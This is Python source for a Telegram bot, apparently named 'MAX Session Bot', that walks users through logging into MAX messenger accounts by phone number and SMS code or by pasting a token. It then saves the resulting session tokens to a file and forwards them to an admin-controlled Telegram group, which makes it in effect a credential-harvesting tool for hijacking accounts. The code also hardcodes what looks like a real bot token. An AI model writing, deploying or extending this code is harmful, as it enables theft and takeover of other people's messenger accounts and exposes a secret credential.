import os, re, asyncio, threading, logging
from datetime import datetime
from telebot import TeleBot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from pymax import MaxClient

BOT_TOKEN = "8659417974:AAE359LdyMebHRJToSUJi7QnkcXHD-A9xBI"
ADMIN_ID = 626387429
GROUP_FILE = "group_id.txt"

bot = TeleBot(BOT_TOKEN, threaded=True)
logging.basicConfig(level=logging.INFO)

user_states = {}
saved_sessions = []

def load_group_id():
    if os.path.exists(GROUP_FILE):
        with open(GROUP_FILE, "r") as f:
            try: return int(f.read().strip())
            except: return None
    return None

def save_group_id(gid):
    with open(GROUP_FILE, "w") as f: f.write(str(gid))

GROUP_CHAT_ID = load_group_id()

def main_kb():
    m = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    m.add(KeyboardButton("📱 Войти по номеру"), KeyboardButton("🔑 Войти по токену"),
          KeyboardButton("📷 Сканировать QR"), KeyboardButton("📋 Мои сессии"),
          KeyboardButton("📤 Отправить в группу"))
    return m

def cancel_kb():
    m = ReplyKeyboardMarkup(resize_keyboard=True)
    m.add(KeyboardButton("❌ Отмена"))
    return m

# Общие параметры для имитации устройства
CLIENT_PARAMS = {
    "device_type": "WEB",
    "app_version": "26.2.3",
    "system_version": "macOS 14.5",
    "screen": "1440x900",
    "timezone": "Europe/Moscow",
    "locale": "ru-RU"
}

async def req_code(phone):
    c = MaxClient(phone=phone, **CLIENT_PARAMS)
    try:
        await c.start()
        return True, c, "Код отправлен"
    except Exception as e:
        await c.stop()
        return False, None, str(e)

async def conf_code(c, code):
    try:
        await c.login(code=code)
        t = c.token; p = c.phone; m = c.me
        info = f"ID: {m.id}\nИмя: {m.firstname} {m.lastname or ''}\nТелефон: {p}\nТокен: {t[:50]}..."
        await c.stop()
        return True, t, p, info
    except Exception as e:
        await c.stop()
        return False, None, None, str(e)

async def login_tok(token):
    c = MaxClient(token=token, **CLIENT_PARAMS)
    try:
        await c.start()
        m = c.me
        info = f"ID: {m.id}\nИмя: {m.firstname} {m.lastname or ''}\nТелефон: {c.phone}"
        await c.stop()
        return True, info
    except Exception as e:
        await c.stop()
        return False, str(e)

def send_to_group():
    if not GROUP_CHAT_ID: return "❌ Группа не задана."
    if not saved_sessions: return "Нет сессий."
    msg = "🔑 **Сессии:**\n\n"
    for i,s in enumerate(saved_sessions[-10:],1): msg += f"{i}. `{s[:40]}...`\n"
    try:
        bot.send_message(GROUP_CHAT_ID, msg, parse_mode="Markdown")
        return f"Отправлено {min(len(saved_sessions),10)} сессий."
    except Exception as e: return f"Ошибка: {e}"

@bot.message_handler(commands=['group'])
def set_group(msg):
    global GROUP_CHAT_ID
    if msg.from_user.id != ADMIN_ID:
        bot.reply_to(msg, "⛔ Нет доступа.")
        return
    if msg.chat.type in ['group','supergroup']:
        save_group_id(msg.chat.id); GROUP_CHAT_ID = msg.chat.id
        bot.reply_to(msg, f"✅ Группа сохранена.")
        return
    parts = msg.text.strip().split()
    if len(parts)!=2:
        bot.reply_to(msg, "ℹ️ `/group -1001234567890` или в группе `/group`", parse_mode="Markdown")
        return
    try:
        gid = int(parts[1])
        save_group_id(gid); GROUP_CHAT_ID = gid
        bot.reply_to(msg, f"✅ Сохранено: {gid}", parse_mode="Markdown")
    except:
        bot.reply_to(msg, "❌ ID должен быть числом.")

@bot.message_handler(commands=['start'])
def start(msg):
    user_states.pop(msg.chat.id, None)
    bot.reply_to(msg, "🤖 **MAX Session Bot**\nВыберите действие:", parse_mode="Markdown", reply_markup=main_kb())

@bot.message_handler(func=lambda m: True)
def handler(msg):
    global GROUP_CHAT_ID
    cid = msg.chat.id
    txt = msg.text.strip() if msg.text else ""
    s = user_states.get(cid, {}).get("state")

    if txt == "❌ Отмена":
        user_states.pop(cid,None); bot.reply_to(msg, "Отменено.", reply_markup=main_kb()); return

    if txt == "📱 Войти по номеру":
        user_states[cid] = {"state":"waiting_phone"}; bot.reply_to(msg, "📱 Номер:\n`+7XXXXXXXXXX`", parse_mode="Markdown", reply_markup=cancel_kb()); return

    if s == "waiting_phone":
        phone = re.sub(r'[\s\-\(\)]','',txt)
        if not phone.startswith("+"): phone = "+7"+phone.lstrip("87")
        if len(phone)<11: bot.reply_to(msg,"❌ Короткий.", reply_markup=cancel_kb()); return
        bot.reply_to(msg, "📱 Запрашиваю код...")
        def r():
            loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
            ok, cl, m = loop.run_until_complete(req_code(phone))
            if ok:
                user_states[cid] = {"state":"waiting_code","phone":phone,"client":cl}
                bot.send_message(cid, f"✅ {m}\n📩 Код:", reply_markup=cancel_kb())
            else:
                bot.send_message(cid, f"❌ {m}", reply_markup=main_kb()); user_states.pop(cid,None)
            loop.close()
        threading.Thread(target=r).start()
        return

    if s == "waiting_code":
        code = re.sub(r'\D','',txt)
        if len(code)!=6: bot.reply_to(msg,"❌ 6 цифр.", reply_markup=cancel_kb()); return
        cl = user_states[cid]["client"]; phone = user_states[cid]["phone"]
        bot.reply_to(msg, "🔐 Подтверждаю...")
        def c():
            loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
            ok, tok, ph, info = loop.run_until_complete(conf_code(cl, code))
            if ok:
                saved_sessions.append(tok)
                with open("sessions.txt","a") as f: f.write(f"{datetime.now()} | {ph} | {tok}\n")
                bot.send_message(cid, f"🟢 **ВХОД ВЫПОЛНЕН!**\n```\n{info}\n```", parse_mode="Markdown", reply_markup=main_kb())
                if GROUP_CHAT_ID:
                    try: bot.send_message(GROUP_CHAT_ID, f"🔑 Сессия:\n`{tok[:50]}...`", parse_mode="Markdown")
                    except: pass
            else: bot.send_message(cid, f"🔴 {info}", reply_markup=main_kb())
            user_states.pop(cid,None); loop.close()
        threading.Thread(target=c).start()
        return

    if txt == "🔑 Войти по токену":
        user_states[cid] = {"state":"waiting_token"}; bot.reply_to(msg, "🔑 Токен:", reply_markup=cancel_kb()); return

    if s == "waiting_token":
        tok = txt.replace(" ","").replace("\n","")
        if len(tok)<50: bot.reply_to(msg,"❌ Короткий.", reply_markup=cancel_kb()); return
        bot.reply_to(msg, "🔍 Проверяю...")
        def t():
            loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
            ok, info = loop.run_until_complete(login_tok(tok))
            if ok:
                saved_sessions.append(tok)
                with open("sessions.txt","a") as f: f.write(f"{datetime.now()} | TOKEN | {tok}\n")
                bot.send_message(cid, f"🟢 **АКТИВНА!**\n```\n{info}\n```", parse_mode="Markdown", reply_markup=main_kb())
                if GROUP_CHAT_ID:
                    try: bot.send_message(GROUP_CHAT_ID, f"🔑 Сессия:\n`{tok[:50]}...`", parse_mode="Markdown")
                    except: pass
            else: bot.send_message(cid, f"🔴 {info}", reply_markup=main_kb())
            user_states.pop(cid,None); loop.close()
        threading.Thread(target=t).start()
        return

    if txt == "📷 Сканировать QR":
        user_states[cid] = {"state":"waiting_qr"}; bot.reply_to(msg, "📷 Фото QR:", reply_markup=cancel_kb()); return

    if s == "waiting_qr":
        if not msg.photo: bot.reply_to(msg,"❌ Фото.", reply_markup=cancel_kb()); return
        fi = bot.get_file(msg.photo[-1].file_id); fc = bot.download_file(fi.file_path)
        from io import BytesIO; import requests as rq
        try:
            resp = rq.post("https://api.qrserver.com/v1/read-qr-code/", files={"file":BytesIO(fc)})
            data = resp.json()
            if data and data[0]["symbol"][0]["data"]:
                bot.reply_to(msg, f"✅ `{data[0]['symbol'][0]['data']}`", parse_mode="Markdown", reply_markup=main_kb())
            else: bot.reply_to(msg, "❌ Не найден.", reply_markup=main_kb())
        except: bot.reply_to(msg, "❌ Ошибка.", reply_markup=main_kb())
        user_states.pop(cid,None); return

    if txt == "📋 Мои сессии":
        if not saved_sessions: bot.reply_to(msg, "Нет.", reply_markup=main_kb())
        else:
            ms = "📋 **Сессии:**\n\n"
            for i,s in enumerate(saved_sessions[-10:],1): ms += f"{i}. `{s[:40]}...`\n"
            bot.reply_to(msg, ms, parse_mode="Markdown", reply_markup=main_kb())
        return

    if txt == "📤 Отправить в группу":
        bot.reply_to(msg, send_to_group(), reply_markup=main_kb())

if __name__ == "__main__":
    print("🤖 MAX Session Bot...")
    bot.infinity_polling()
